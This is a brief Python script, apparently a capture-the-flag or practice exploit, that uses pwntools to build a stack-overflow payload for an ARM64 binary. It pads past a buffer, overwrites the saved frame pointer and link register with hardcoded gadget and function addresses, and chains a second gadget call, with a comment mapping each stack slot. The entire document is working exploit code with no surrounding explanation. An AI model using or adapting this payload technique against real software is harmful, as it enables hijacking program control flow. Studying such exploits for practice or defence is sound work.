from pwn import *

g = p64(0x100003EFC)
ls = p64(0x100008000)
pad = p64(0xFFFFFFFFFFFFFFC0) # -0x40
main = p64(0x100003F1C)

p = b"A"*44
p += g + b"A"*8 + p64(0x10) + main + b"A"*32
p += g + ls + pad


print(p)

'''
X29 AAAAAAAA [oldSP+0x30]
X30 g		 [oldSP+0x38]
AAAAAAAA     [SP+0x0]
p64(0x10)    [SP+0x8]
main         [SP+0x10]
AAAAAAAA     [SP+0x18]
AAAAAAAA     [SP+0x20]
AAAAAAAA     [SP+0x28]
AAAAAAAA     [SP+0x30]
g            [SP+0x38]
ls           [newSP+0x0]
pad          [newSP+0x8]
'''